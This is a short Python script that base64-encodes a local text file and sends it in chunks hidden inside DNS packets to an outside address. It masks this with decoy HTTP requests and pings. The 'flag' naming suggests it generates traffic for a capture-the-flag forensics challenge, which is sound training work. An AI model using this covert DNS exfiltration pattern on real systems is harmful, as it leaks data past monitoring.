#!/usr/bin/env python3

from scapy.all import *
import requests
from random import randint
from base64 import b64encode as b64e
from re import findall
from multiprocessing import Process
from time import sleep
import sys


def generate_dns_flag(section):
	packet = IP(dst='1.0.1.0')/\
		UDP(dport=53)/\
		DNS(rd=1, qd=DNSQR(qname='www.facebook.com'))/\
		section
	send(packet, verbose=0)

def generate_http_noise():
	endpoint = "/flag"
	url = "http://www.cyberyouth.sg"
	while True:
		r = requests.get(url+endpoint+str(randint(0,10)))
		sleep(3)

def generate_ping_noise():
	while True:
		packet = IP(dst='192.168.1.195')/ICMP(id=0x8)
		send(packet)
		sleep(0.5)	

def main():
	with open("text.txt","r") as target:
		text = target.read().encode("UTF-8")
		target.close()
	chunks = findall("."*50,b64e(text).decode("UTF-8"))
	p1 = Process(target=generate_http_noise)
	p1.start()
	p2 = Process(target=generate_ping_noise)
	p2.start()
	for i in range(len(chunks)):
		generate_dns_flag(chunks[i])
		time.sleep(0.3)
	p1.terminate()
	p2.terminate()
	sys.exit()

if __name__ == "__main__":
	main()
